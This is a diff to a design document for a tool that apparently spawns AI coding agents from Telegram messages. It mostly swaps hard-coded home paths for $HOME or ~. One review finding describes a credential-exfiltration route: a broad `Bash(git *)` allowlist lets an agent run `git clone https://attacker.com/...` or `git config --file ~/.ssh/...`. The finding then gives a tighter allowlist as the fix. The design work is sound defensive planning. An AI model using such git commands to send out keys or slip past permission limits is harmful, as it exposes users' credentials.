@@ -435,7 +435,7 @@ The integration's audit writer is a 10-line `fs.appendFile` helper with `mkdir -
 
 ```jsonl
 {"ts":"2026-05-04T10:14:22Z","kind":"message_received","sender":1234567,"text":"fix sweep button","len":15}
-{"ts":"2026-05-04T10:14:24Z","kind":"rephrased","provider":"groq","model":"llama-4-scout","tokens":{"in":847,"out":312},"estUsd":0.0008,"specCwd":"/home/jean/git/kookr"}
+{"ts":"2026-05-04T10:14:24Z","kind":"rephrased","provider":"groq","model":"llama-4-scout","tokens":{"in":847,"out":312},"estUsd":0.0008,"specCwd":"$HOME/git/kookr"}
 {"ts":"2026-05-04T10:14:24Z","kind":"confirmation_pending","hash":"sha256:abc..."}
 {"ts":"2026-05-04T10:14:38Z","kind":"spawn_reserved","capUsage":{"spawns":3,"usd":0.0072}}
 {"ts":"2026-05-04T10:14:39Z","kind":"spawned","taskId":"t-abc123","autonomy":"supervised","permissionMode":"remote-spawned","dryRun":false}
@@ -901,7 +901,7 @@ Five subagents reviewed v2 in parallel: boundary-critic, failure-mode-analyst, d
 
 - **N1/N2/N3/N4 — adapter plumbing details.** Resolved by the §4 rewrite above. Adapter test surface explicitly budgeted in Phase 1 (4 combos × allowlist mode).
 - **N2 specifically — Codex `--full-auto` auto-approves edits.** Verified at `codex-cli-adapter.ts:178-180`. v3 adds R19: V1 forces `agentType: 'claude-code'`. Codex remote-spawn deferred until `--full-auto` semantics are validated (Phase 1 prerequisite POC).
-- **N5/N12/N20 — credential-exfil before any prompt.** v2 hand-waved this with "blocks at first permission prompt" but the default allowlist (`Bash(git *)`) is itself an exfil channel via `git clone https://attacker.com/...` and `git config --file /home/jean/.ssh/...`. v3 adds R15 + `buildRemoteSpawnAllowlist()`: enumerated git subcommands, `Read/Write` scoped to cwd only, no broad shell egress.
+- **N5/N12/N20 — credential-exfil before any prompt.** v2 hand-waved this with "blocks at first permission prompt" but the default allowlist (`Bash(git *)`) is itself an exfil channel via `git clone https://attacker.com/...` and `git config --file ~/.ssh/...`. v3 adds R15 + `buildRemoteSpawnAllowlist()`: enumerated git subcommands, `Read/Write` scoped to cwd only, no broad shell egress.
 - **N6 — callback for GC'd pending hash gives user nothing.** v3 sends explicit `answerCallbackQuery` with "this confirmation expired, send again."
 - **N7 — UTC midnight cap reset attack window.** v3: rolling 24h window keyed off each successful spawn, not a calendar reset.
 - **N8 — `~/.kookr/` may be port-scoped, breaks lockfile premise.** v3 uses `KOOKR_DATA_DIR` resolution. The lockfile is *token-scoped* in practice: if both worktrees set the same bot token, both will try to acquire `<their-dataDir>/telegram/lock` — and Telegram's API will deliver to whichever pollster gets there first. The flock is per-process within one dataDir. Cross-dataDir contention on the same token is documented as: "set the token in only one worktree's `.env`", which is the correct user-level discipline.
